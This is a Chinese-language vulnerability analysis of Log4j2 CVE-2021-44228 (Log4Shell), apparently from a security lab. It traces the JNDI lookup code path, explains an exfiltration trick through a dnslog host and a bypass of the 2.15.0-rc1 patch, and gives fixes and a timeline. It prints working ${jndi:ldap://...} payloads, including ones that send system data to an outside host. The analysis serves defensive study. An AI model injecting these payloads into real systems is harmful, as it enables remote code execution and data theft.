## 0x01前言

最近IT圈被爆出的log4j2漏洞闹的沸沸扬扬，log4j2作为一个优秀的java程序日志监控组件，被应用在了各种各样的衍生框架中，同时也是作为目前java全生态中的基础组件之一，这类组件一旦崩塌将造成不可估量的影响。

从[Apache Log4j2 漏洞影响面查询](https://log4j2.huoxian.cn/layout "Apache Log4j2
漏洞影响面查询")的统计来看，影响多达60644个开源软件，涉及相关版本软件包更是达到了321094个。而本次漏洞的触发方式简单，利用成本极低，可以说是一场java生态的‘浩劫’。本文将从零到一带你深入了解log4j2漏洞。知其所以然，方可深刻理解、有的放矢。

## 0x02 Java日志体系

要了解认识log4j2，就不得讲讲java的日志体系，在最早的2001年之前，java是不存在日志库的，打印日志均通过`System.out`和`System.err`来进行，缺点也显而易见，列举如下：

> 大量IO操作；
>
> 无法合理控制输出，并且输出内容不能保存，需要盯守；
>
> 无法定制日志格式，不能细粒度显示；

在2001年，软件开发者`Ceki
Gulcu`设计出了一套日志库也就是log4j（注意这里没有2）。后来log4j成为了Apache的项目，作者也加入了Apache组织。这里有一个小插曲，Apache组织建议过sun公司在标准库中引入log4j，但是sun公司可能有自己的小心思，所以就拒绝了建议并在JDK1.4中推出了自己的借鉴版本JUL（Java
Util Logging）。不过功能还是不如Log4j强大。使用范围也很小。

由于出现了两个日志库，为了方便开发者进行选择使用，Apache推出了日志门面`JCL（Jakarta Commons
Logging）`。它提供了一个日志抽象层，在运行时动态的绑定日志实现组件来工作（如log4j、java.util.logging）。导入哪个就绑定哪个，不需要再修改配置。当然如果没导入的话他自己内部有一个Simple
logger的简单实现，但是功能很弱，直接忽略。架构如下图：

![image](https://image.3001.net/images/20211224/1640309653_61c52395514bd94818192.png!small)

在2006年，log4j的作者`Ceki Gulcu`离开了Apache组织后觉得JCL不好用，于是自己开发了一版和其功能相似的`Slf4j（Simple
Logging Facade for
Java）`。Slf4j需要使用桥接包来和日志实现组件建立关系。由于Slf4j每次使用都需要配合桥接包，作者又写出了`Logback`日志标准库作为Slf4j接口的默认实现。其实根本原因还是在于log4j此时无法满足要求了。以下是桥接架构图：

![image](https://image.3001.net/images/20211224/1640309451_61c522cb49693439837bd.png!small)

到了2012年，Apache可能看不要下去要被反超了，于是就推出了新项目`Log4j2`并且不兼容Log4j，全面借鉴`Slf4j+Logback`。此次借鉴比较成功。

>
> Log4j2不仅仅具有Logback的所有特性，还做了分离设计，分为log4j-api和log4j-core，log4j-api是日志接口，log4j-core是日志标准库，并且Apache也为Log4j2提供了各种桥接包

到目前为止Java日志体系被划分为两大阵营，分别是Apache阵营和Ceki阵营。

![image](https://image.3001.net/images/20211224/1640309464_61c522d851e18f9bc6b8d.png!small)

## 0x03 Log4j2源码浅析

>
> Log4j2是Apache的一个开源项目，通过使用Log4j2，我们可以控制日志信息输送的目的地是控制台、文件、GUI组件，甚至是套接口服务器、NT的事件记录器、UNIX
> Syslog守护进程等；我们也可以控制每一条日志的输出格式；通过定义每一条日志信息的级别，我们能够更加细致地控制日志的生成过程。最令人感兴趣的就是，这些可以通过一个配置文件来灵活地进行配置，而不需要修改应用的代码。

从上面的解释中我们可以看到Log4j2的功能十分强大，这里会简单分析其与漏洞相关联部分的源码实现，来更熟悉Log4j2的漏洞产生原因。

我们使用maven来引入相关组件的2.14.0版本，在工程的pom.xml下添加如下配置，他会导入两个jar包

    
    
    <dependencies>
    <dependency>
        <groupId>org.apache.logging.log4j</groupId>
        <artifactId>log4j-core</artifactId>
        <version>2.14.0</version>
    </dependency>
    </dependencies>
    

![image](https://image.3001.net/images/20211224/1640309675_61c523ab5e095869d55f0.png!small)

在工程目录resources下创建log4j2.xml配置文件

    
    
    <?xml version="1.0" encoding="UTF-8"?>
    
    <configuration status="error">
    <appenders>
    <!--        配置Appenders输出源为Console和输出语句SYSTEM_OUT-->
        <Console name="Console" target="SYSTEM_OUT" >
    <!--            配置Console的模式布局-->
            <PatternLayout pattern="%d{yyyy-MM-dd HH:mm:ss.SSS} [%t] %level %logger{36} - %msg%n"/>
        </Console>
    </appenders>
    <loggers>
        <root level="error">
            <appender-ref ref="Console"/>
        </root>
    </loggers>
    </configuration>
    

log4j2中包含两个关键组件`LogManager`和`LoggerContext`。`LogManager`是Log4J2启动的入口，可以初始化对应的`LoggerContext`。`LoggerContext`会对配置文件进行解析等其它操作。

在不使用slf4j的情况下常见的Log4J用法是从LogManager中获取Logger接口的一个实例，并调用该接口上的方法。运行下列代码查看打印结果

    
    
    import org.apache.logging.log4j.LogManager;
    import org.apache.logging.log4j.Logger;
    
    
    public class log4j2Rce2 {
    private static final Logger logger = LogManager.getLogger(log4j2Rce2.class);
    public static void main(String[] args) {
        String a="${java:os}";
        logger.error(a);
    }
    }
    

![image](https://image.3001.net/images/20211224/1640309686_61c523b6e178ea0ba7a2f.png!small)

> 属性占位符之Interpolator（插值器）

log4j2中环境变量键值对被封装为了StrLookup对象。这些变量的值可以通过属性占位符来引用，格式为:`${prefix:key}`。在Interpolator（插值器）内部以Map<String,StrLookup>的方式则封装了多个StrLookup对象，如下图显示：

![image](https://image.3001.net/images/20211224/1640310260_61c525f455fd91bf5aedc.png!small)

详细信息可以查看[官方文档](https://logging.apache.org/log4j/2.x/manual/lookups.html
"log4j2 lookups")。这些实现类存在于`org.apache.logging.log4j.core.lookup`包下。

当参数占位符`${prefix:key}`带有prefix前缀时，Interpolator会从指定prefix对应的StrLookup实例中进行key查询。当参数占位符`${key}`没有prefix时，Interpolator则会从默认查找器中进行查询。如使用`${jndi:key}`时，将会调用`JndiLookup`的`lookup方法`使用jndi(javax.naming)获取value。如下图演示。

![image](https://image.3001.net/images/20211224/1640310279_61c526073ea4453fd27c9.png!small)

> 模式布局

log4j2支持通过配置Layout打印格式化的指定形式日志，可以在Appenders的后面附加Layouts来完成这个功能。常用之一有`PatternLayout`，也就是我们在配置文件中`PatternLayout`字段所指定的属性`pattern`的值`%d{yyyy-MM-dd HH:mm:ss.SSS} [%t] %level %logger{36} -%msg%n`。`%msg`表示所输出的消息，其它格式化字符所表示的意义可以查看[官方文档](https://logging.apache.org/log4j/2.x/manual/layouts.html
"log4j2 layouts")。

![image](https://image.3001.net/images/20211224/1640310296_61c52618ec7831891f77a.png!small)

`PatternLayout`模式布局会通过PatternProcessor模式解析器，对模式字符串进行解析，得到一个`List<PatternConverter>`转换器列表和`List<FormattingInfo>`格式信息列表。

在配置文件`PatternLayout`标签的`pattern`属性中我们可以看到类似%d的写法，d代表一个转换器名称，log4j2会通过`PluginManager`收集所有类别为Converter的插件，同时分析插件类上的@ConverterKeys注解,获取转换器名称，并建立名称到插件实例的映射关系，当PatternParser识别到转换器名称的时候，会查找映射。相关转换器名称注解和加载的插件实例如下图所示：

![image](https://image.3001.net/images/20211224/1640310322_61c52632091f94ff25b9a.png!small)

![image](https://image.3001.net/images/20211224/1640310331_61c5263b30c6836356b47.png!small)

本次漏洞关键在于转换器名称`msg`对应的插件实例`MessagePatternConverter`对于日志中的消息内容处理存在问题，在大多数场景下这部分是攻击者可控的。`MessagePatternConverter`会将日志中的消息内容为`${prefix:key}`格式的字符串进行解析转换，读取环境变量。此时为jndi的方式的话，就存在漏洞。

> 日志级别

log4j2支持多种日志级别，通过日志级别我们可以将日志信息进行分类，在合适的地方输出对应的日志。哪些信息需要输出，哪些信息不需要输出，只需在一个日志输出控制文件中稍加修改即可。级别由高到低共分为6个：`fatal(致命的),
error, warn, info, debug,
trace(堆栈)。`log4j2还定义了一个内置的标准级别`intLevel`，由数值表示，级别越高数值越小。

当日志级别（调用）大于等于系统设置的`intLevel`的时候，log4j2才会启用日志打印。在存在配置文件的时候 ，会读取配置文件中`<root
level="error">`值设置`intLevel`。当然我们也可以通过`Configurator.setLevel("当前类名",
Level.INFO);`来手动设置。如果没有配置文件也没有指定则会默认使用Error级别，也就是200，如下图中的处理：

![image](https://image.3001.net/images/20211227/1640571176_61c921284dd54c60f40ff.png!small)

## 0x04 漏洞原理

首先先来看一下网络上流传最多的payload

    
    
    ${jndi:ldap://2lnhn2.ceye.io}
    

而触发漏洞的方法，大家都是以Logger.error()方法来进行演示，那这里我们也采用同样的方式来讲解，具体漏洞环境代码如下所示

    
    
    import org.apache.logging.log4j.Level;
    import org.apache.logging.log4j.LogManager;
    import org.apache.logging.log4j.Logger;
    import org.apache.logging.log4j.core.config.Configurator;
    
    public class Log4jTEst {
    
    public static void main(String[] args) {
    
        Logger logger = LogManager.getLogger(Log4jTEst.class);
    
        logger.error("${jndi:ldap://2lnhn2.ceye.io}");
    
    }
    }
    

直击漏洞本源，将断点断在`org/apache/logging/log4j/core/appender/AbstractOutputStreamAppender.java`中的`directEncodeEvent`方法上，该方法的第一行代码将返回当前使用的布局，并调用
对应布局处理器的encode方法。log4j2默认缺省布局使用的是PatternLayout，如下图所示：

![image](https://image.3001.net/images/20211227/1640571194_61c9213a15afbaa9f4ad9.png!small)

继续跟进在encode中会调用toText方法，根据注释该方法的作用为创建指定日志事件的文本表示形式，并将其写入指定的StringBuilder中。

![image](https://image.3001.net/images/20211227/1640571205_61c92145c73605ae639f2.png!small)

![image](https://image.3001.net/images/20211227/1640571214_61c9214e2bf476e62117a.png!small)

接下来会调用`serializer.toSerializable`，并在这个方法中调用不同的Converter来处理传入的数据，如下图所示，

![image](https://image.3001.net/images/20211227/1640571224_61c92158d486cd056b0c0.png!small)

这里整理了一下调用的Converter

    
    
    org.apache.logging.log4j.core.pattern.DatePatternConverter
    org.apache.logging.log4j.core.pattern.LiteralPatternConverter
    org.apache.logging.log4j.core.pattern.ThreadNamePatternConverter
    org.apache.logging.log4j.core.pattern.LevelPatternConverter
    org.apache.logging.log4j.core.pattern.LoggerPatternConverter
    org.apache.logging.log4j.core.pattern.MessagePatternConverter
    org.apache.logging.log4j.core.pattern.LineSeparatorPatternConverter
    org.apache.logging.log4j.core.pattern.ExtendedThrowablePatternConverter
    

这么多Converter都将一个个通过上图中的for循环对日志事件进行处理，当调用到MessagePatternConverter时，我们跟入MessagePatternConverter.format()方法中一探究竟

![image](https://image.3001.net/images/20211227/1640571234_61c92162786db27eeca51.png!small)

在MessagePatternConverter.format()方法中对日志消息进行格式化，其中很明显的看到有针对字符"$"和"{"的判断，而且是连着判断，等同于判断是否存在"${"，这三行代码中关键点在于最后一行

![image](https://image.3001.net/images/20211227/1640571242_61c9216a9841fb8a7a225.png!small)

这里我圈了几个重点，有助于理解Log4j2
为什么会用JndiLookup，它究竟想要做什么。此时的workingBuilder是一个StringBuilder对象，该对象存放的字符串如下所示

    
    
    09:54:48.329 [main] ERROR com.Test.log4j.Log4jTEst - ${jndi:ldap://2lnhn2.ceye.io}
    

本来这段字符串的长度是82，但是却给它改成了53，为什么呢？因为第五十三的位置就是`$`符号，也就是说`${jndi:ldap://2lnhn2.ceye.io}`这段不要了，从第53位开始append。而append的内容是什么呢？

可以看到传入的参数是config.getStrSubstitutor().replace(event,
value)的执行结果，其中的value就是`${jndi:ldap://2lnhn2.ceye.io}`这段字符串。replace的作用简单来说就是想要进行一个替换，我们继续跟进

![image](https://image.3001.net/images/20211227/1640571251_61c921739e3b7177fa215.png!small)

经过一段的嵌套调用，来到`Interpolator.lookup`，这里会通过`var.indexOf(PREFIX_SEPARATOR)`判断":"的位置，其后截取之前的字符。截取到jndi然后就会获取针对jndi的Strlookup对象并调用Strlookup的lookup方法，如下图所示

![image](https://image.3001.net/images/20211227/1640571258_61c9217abe9c5cdc1fbe6.png!small)

那么总共有多少Strlookup的子类对象可供选择呢，可供调用的Strlookup都存放在当前Interpolator类的strLookupMap属性中，如下所示

![image](https://image.3001.net/images/20211227/1640571266_61c9218216c132eb6b365.png!small)

然后程序的继续执行就会来到JndiLookup的lookup方法中，并调用jndiManager.lookup方法，如下图所示

![image](https://image.3001.net/images/20211227/1640571275_61c9218b2deb517d78f47.png!small)

说到这里，我们已经详细了解了logger.error()造成RCE的原理，那么问题就来了，logger有很多方法，除了error以外还别方法可以触发漏洞么？这里就要提到Log4j2的日志优先级问题，每个优先级对应一个数值`intLevel`记录在StandardLevel这个枚举类型中，数值越小优先级越高。如下图所示：

![image](https://image.3001.net/images/20211227/1640571283_61c9219323f7e7ce7c988.png!small)

当我们执行Logger.error的时候，会调用Logger.logIfEnabled方法进行一个判断，而判断的依据就是这个日志优先级的数值大小

![image](https://image.3001.net/images/20211227/1640571290_61c9219a7dd16da5bdf03.png!small)

![image](https://image.3001.net/images/20211227/1640571297_61c921a11da63bee627c8.png!small)

跟进isEnabled方法发现，只有当前日志优先级数值小于Log4j2的200的时候，程序才会继续往下走，如下所示

![image](https://image.3001.net/images/20211227/1640571303_61c921a792092b0621934.png!small)

而这里日志优先级数值小于等于200的就只有"error"、"fatal"，这两个，所以logger.fatal()方法也可触发漏洞。但是"warn"、"info"大于200的就触发不了了。

但是这里也说了是默认情况下，日志优先级是以error为准，Log4j2的缺省配置文件如下所示。

    
    
    <?xml version="1.0" encoding="UTF-8"?>
    <Configuration status="WARN">
    <Appenders>
     <Console name="Console" target="SYSTEM_OUT">
       <PatternLayout pattern="%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n"/>
     </Console>
    </Appenders>
    <Loggers>
     <Root level="error">
       <AppenderRef ref="Console"/>
     </Root>
    </Loggers>
    </Configuration>
    

所以只需要做一点简单的修改，将`<Root
level="error">`中的error改成一个优先级比较低的，例如"info"这样，只要日志优先级高于或者等于info的就可以触发漏洞，修改过后如下所示

    
    
    <?xml version="1.0" encoding="UTF-8"?>
    <Configuration status="WARN">
        <Appenders>
            <Console name="Console" target="SYSTEM_OUT">
                <PatternLayout pattern="%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n"/>
            </Console>
        </Appenders>
        <Loggers>
            <Root level="info">
                <AppenderRef ref="Console"/>
            </Root>
        </Loggers>
    </Configuration>
    

关于Jndi部分的远程类加载利用可以参考实验室往常的文章：[Java反序列化过程中 RMI JRMP
以及JNDI多种利用方式详解](http://blog.topsec.com.cn/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%87%E7%A8%8B%E4%B8%AD-rmi-jrmp-%E4%BB%A5%E5%8F%8Ajndi%E5%A4%9A%E7%A7%8D%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E8%AF%A6%E8%A7%A3/
"Java反序列化过程中 RMI JRMP 以及JNDI多种利用方式详解")、[JAVA
JNDI注入知识详解](http://blog.topsec.com.cn/java-jndi%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E8%AF%A6%E8%A7%A3/ "JAVA JNDI注入知识详解")

## 0x05 敏感数据带外

当目标服务器本身受到防护设备流量监控等原因，无法反弹shell的时候，Log4j2还可以通过修改payload，来外带一些敏感信息到dnslog服务器上，这里简单举一个例子，根据Apache
Log4j2官方提供的信息，获取环境变量信息除了jndi之外还有很多的选择可供使用，具体可查看前文给出的链接。根据文档中所述，我们可以用下面的方式来记录当前登录的用户名，如下所示

    
    
    <File name="Application" fileName="application.log">
      <PatternLayout>
        <pattern>%d %p %c{1.} [%t] $${env:USER} %m%n</pattern>
      </PatternLayout>
    </File>
    

获取java运行时版本，jvm版本，和操作系统版本，如下所示

    
    
    <File name="Application" fileName="application.log">
      <PatternLayout header="${java:runtime} - ${java:vm} - ${java:os}">
        <Pattern>%d %m%n</Pattern>
      </PatternLayout>
    </File>
    

类似的操作还有很多，感兴趣的同学可以去阅读下官方文档。

那么问题来了，如何将这些信息外带出去，这个时候就还要利用我们的dnsLog了，就像在sql注入中通过dnslog外带信息一样，payload改成以下形式

    
    
    "${jndi:ldap://${java:os}.2lnhn2.ceye.io}"
    

从表上看这个payload执行原理也不难，肯定是log4j2 递归解析了呗，为了严谨一下，就再废话一下log4j2解析这个payload的执行流程

首先还是来到MessagePatternConverter.format方法，然后是调用StrSubstitutor.replace方法进行字符串处理，如下图所示

![image](https://image.3001.net/images/20211227/1640571316_61c921b4b767de897662c.png!small)

只不过这次迭代处理先处理了"${java:os}",如下图所示

![image](https://image.3001.net/images/20211227/1640571323_61c921bb9919e22123d5b.png!small)

如此一来，就来到了JavaLookup.lookup方法中，并根据传入的参数来获取指定的值

![image](https://image.3001.net/images/20211227/1640571331_61c921c3758a3b85ac4af.png!small)

解析完成后然后log4j2才会去解析外层的`${jndi:ldap://2lnhn2.ceye.io}`，最后请求的dnslog地址如下

![image](https://image.3001.net/images/20211227/1640571340_61c921cccdf6935620f50.png!small)

此时就实现了将敏感信息回显到dnslog上，利用的就是log4j2的递归解析，来dnslog上查看一下回显效果，如下所示

![image](https://image.3001.net/images/20211227/1640571349_61c921d533cae27d5d240.png!small)

但是这种回显的数据是有限制的，例如下面这种情况，使用如下payload

    
    
    ${jndi:ldap://${java:os}.2lnhn2.ceye.io}
    

执行完成后请求的地址如下

![image](https://image.3001.net/images/20211227/1640571356_61c921dcbbb07313cca3c.png!small)

最后会报如下错误，并且无法回显

![image](https://image.3001.net/images/20211227/1640571364_61c921e45168045ada93e.png!small)

## 0x06 2.15.0 rc1绕过详解

在Apache
log4j2漏洞大肆传播的当天，log4j2官方发布的rc1补丁就传出的被绕过的消息，于是第一时间也跟着研究究竟是怎么绕过的，分析完后发现，这个“绕过”属实是一言难尽，下面就针对这个绕过来解释一下为何一言难尽。

首先最重要的一点，就是需要修改配置，默认配置下是不能触发JNDI远程加载的，单就这个条件来说我觉得就很勉强了，但是确实更改了配置后就可以触发漏洞，所以这究竟算不算绕过，还要看各位同学自己的看法了。

首先在这次补丁中MessagePatternConverter类进行了大改，可以看下修改前后MessagePatternConverter这个类的结构对比

修改前

![image](https://image.3001.net/images/20211227/1640571372_61c921ecc26efbd56679f.png!small)

修改后

![image](https://image.3001.net/images/20211227/1640571379_61c921f3aca5f64aa0153.png!small)

可以很清楚的看到
增加了三个静态内部类，每个内部类都继承自MessagePatternConverter，且都实现了自己的format方法。之前执行链上的MessagePatternConverter.format()方法则变成了下面这样

![image](https://image.3001.net/images/20211227/1640571388_61c921fc5a496d46d10da.png!small)

在rc1这个版本中Log4j2在初始化的时候创建的Converter也变了，

![image](https://image.3001.net/images/20211227/1640571395_61c92203a014ddef72fc1.png!small)

整理一下，可以看的更清晰一些

    
    
    DatePatternConverter
    SimpleLiteralPatternConverter$StringValue
    ThreadNamePatternConverter
    LevelPatternConverter$SimpleLevelPatternConverter
    LoggerPatternConverter
    MessagePatternConverter$SimpleMessagePatternConverter
    LineSeparatorPatternConverter
    ExtendedThrowablePatternConverter
    

之前的MessagePatternConverter，变成了现在的MessagePatternConverter$SimpleMessagePatternConverter，那么这个SimpleMessagePatternConverter的方法究竟是怎么实现的，如下所示

![image](https://image.3001.net/images/20211227/1640571404_61c9220c80bd74f1f3bee.png!small)

可以看到并没有对传入的数据的“${”符号进行判断并特殊处理，那么之前造成漏洞的点就没有了么？当然不是，对“${}”的处理，开发者将其转移到了LookupMessagePatternConverter.format()方法中,如下所示

![image](https://image.3001.net/images/20211227/1640571411_61c92213b2734914c0c26.png!small)

问题来了，如何才能让log4j2在初始化的时候就实例化LookupMessagePatternConverter从而能让程序在后续的执行过程中调用它的format方法呢？

其实很简单，但这也是我说这个绕过“一言难尽”的一个点，就是要修改配置文件，修改成如下所示在“%msg”的后面添加一个“{lookups}”，我相信一般情况下应该没有那个开发者会这么改配置文件玩，除非他真的需要log4j2提供的jndi
lookup功能，修改后的配置文件如下所示

    
    
    <?xml version="1.0" encoding="UTF-8"?>
    <Configuration status="WARN">
        <Appenders>
            <Console name="Console" target="SYSTEM_OUT">
                <PatternLayout pattern="[%-level]%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg{lookups}%n"/>
            </Console>
        </Appenders>
        <Loggers>
            <Root level="info">
                <AppenderRef ref="Console"/>
            </Root>
        </Loggers>
    </Configuration>
    

这样一来就可以触发LookupMessagePatternConverter.format()方法了，但是单单只改配置，还是不行，因为JndiManager.lookup方法也进行了修改，增加了白名单校验，这就意味着我们还要修改payload来绕过这么一个校验，校验点代码如下所示

![image](https://image.3001.net/images/20211227/1640571420_61c9221c46e5b540ba2e1.png!small)

当判断以ldap开头的时候，就回去判断请求的host，也就是请求的地址，白名单内容如下所示

![image](https://image.3001.net/images/20211227/1640571426_61c92222cc36aa0040d3a.png!small)

可以看到白名单里要么是本机地址，要么是内网地址，fe80开头的ipv6地址也是内网地址，看似想要绕过有些困难，因为都是内网地址，没法请求放在公网的ldap服务，不过不用着急，继续往下看。

使用marshalsec开启ldap服务后，先将payload修改成下面这样

    
    
    ${jndi:ldap://127.0.0.1:8088/ExportObject}
    

如此一来就可以绕过第一道校验，过了这个host校验后，还有一个校验，在JndiManager.lookup方法中，会将请求ldap服务后
ldap返回的信息以map的形式存储，如下所示

![image](https://image.3001.net/images/20211227/1640571434_61c9222a4e9ae16bebbd2.png!small)

这里要求javaFactory为空，否则就会返回"Referenceable class is not allowed for
xxxxxx"的错误，想要绕过这一点其实也很简单，在JndiManager.lookup方法中有一个非常非常离谱的错误，就是在捕获异常后没有进行返回，甚至没有进行任何操作，我看不懂，但我大为震撼。这样导致了程序还会继续向下执行，从而走到最后的this.context.lookup()这一步
，如下所示

![image](https://image.3001.net/images/20211227/1640571441_61c922311527c9cffba16.png!small)

也就是说只要让lookup方法在执行的时候抛个异常就可以了，将payload修改成以下的形式

    
    
    ${jndi:ldap://xxx.xxx.xxx.xxx:xxxx/ ExportObject}
    

在url中“/”后加上一个空格，就会导致lookup方法中一开始实例化URI对象的时候报错，这样不仅可以绕过第二道校验，连第一个针对host的校验也可以绕过，从而再次造成RCE。在rc2中，catch错误之后，return
null，也就走不到lookup方法里了。

## 0x07 修复&临时建议

在最新的修复`https://github.com/apache/logging-log4j2/commit/44569090f1cf1e92c711fb96dfd18cd7dccc72ea`中，在初始化插值器时新增了检查jndi协议是否启用的判断，并且默认禁用了jndi协议的使用。

![image](https://image.3001.net/images/20211227/1640571451_61c9223bc92190c6b1d42.png!small)

![image](https://image.3001.net/images/20211227/1640571460_61c92244be86fea5d7fe3.png!small)

修复建议：

> 升级Apache Log4j2所有相关应用到最新版。
>
> 升级JDK版本，建议JDK使用11.0.1、8u191、7u201、6u211及以上的高版本。但仍有绕过Java本身对Jndi远程加载类安全限制的风险。

临时建议：

> jvm中添加参数 -Dlog4j2.formatMsgNoLookups=true **（版本 >=2.10.0）**
>
> 新建log4j2.component.properties文件，其中加上配置log4j2.formatMsgNoLookups=true **（版本
> >=2.10.0）**
>
> 设置系统环境变量：LOG4J_FORMAT_MSG_NO_LOOKUPS=true **（版本 >=2.10.0）**
>
> 对于log4j2 < 2.10以下的版本，可以通过移除JndiLookup类的方式。

## 0x08 时间线

2021年11月24日：阿里云安全团队向Apache 官方提交ApacheLog4j2远程代码执行漏洞（CVE-2021-44228）

2021年12月8日：Apache Log4j2官方发布安全更新log4j2-2.15.0-rc1，

2021年12月9日：天融信阿尔法实验室晚间监测到poc大量传播并被利用攻击

2021年12月10日：天融信阿尔法实验室于10日凌晨发布Apache Log4j2 远程代码执行漏洞预警，并于当日发布Apache Log4j2
漏洞处置方案

2021年12月10日：同一天内，网络传出log4j2-2.15.0-rc1安全更新被绕过，天融信阿尔法实验室第一时间进行验证，发现绕过存在，并将处置方案内的升级方案修改为log4j2-2.15.0-rc2

2021年12月15日：天融信阿尔法实验室对该漏洞进行了深入分析并更新修复建议。

## 0x09 总结

log4j2这次漏洞的影响是核弹级的，堪称web漏洞届的永恒之蓝，因为作为一个日志系统，有太多的开发者使用，也有太多的开源项目将其作为默认日志系统。所以可以见到，在未来的几年内，Apache
log4j2 很可能会接替Shiro的位置，作为护网的主要突破点。

该漏洞的原理并不复杂，甚至如果认真读了官方文档可能就可以发现这个漏洞，因为这次的漏洞究其原理就是log4j2所提供的正常功能，但是不管是log4j2的开发者也好，还是使用log4j2进行开发的开发者也好，他们都犯了一个致命的错误，就是相信了用户的输入。

永远不要相信用户的输入，想必这是每一个开发人员都听过的一句话，可惜，真正能做到的人太少了。对于开源软件的生态安全，也需要相关企业和组织加以关注和共同建设，安全之路任重而道远。

# 参考资料

> [Apache Log4j2 漏洞影响面查询](https://log4j2.huoxian.cn/layout)
>
> [log4j2 lookups](https://logging.apache.org/log4j/2.x/manual/lookups.html)
>
> [log4j2 layouts](https://logging.apache.org/log4j/2.x/manual/layouts.html)
>
> [Java反序列化过程中 RMI JRMP
> 以及JNDI多种利用方式详解](http://blog.topsec.com.cn/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%87%E7%A8%8B%E4%B8%AD-> rmi-> jrmp-%E4%BB%A5%E5%8F%8Ajndi%E5%A4%9A%E7%A7%8D%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E8%AF%A6%E8%A7%A3/)
>
> [JAVA JNDI注入知识详解](http://blog.topsec.com.cn/java-> jndi%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E8%AF%A6%E8%A7%A3/)
>
> [Log4j 0day之rc1与rc2
> 有趣的绕过](https://mp.weixin.qq.com/s/_qA3ZjbQrZl2vowikdPOIg%0A)
>
> [Log4j2 研究之lookup](https://mp.weixin.qq.com/s/K74c1pTG6m5rKFuKaIYmPg)
>
> [log4j2 JNDI 注入漏洞分析﻿](https://www.cnpanda.net/sec/1114.html)
>
> [log4j2源码分析](https://www.jianshu.com/p/0c882ced0bf5)
>
> [代码审计-log4j2_rce分析](https://mp.weixin.qq.com/s/ZHcrraF2Agk8EEe-3_O18Q)
>
> [Apache Log4j2 Jndi
> RCE高危漏洞分析与防御](https://mp.weixin.qq.com/s/19oIId_Ax2nxJ00k6vFhDg)
>
> [Java日志的心路历程﻿](https://blog.csdn.net/a1405/article/details/116561152)

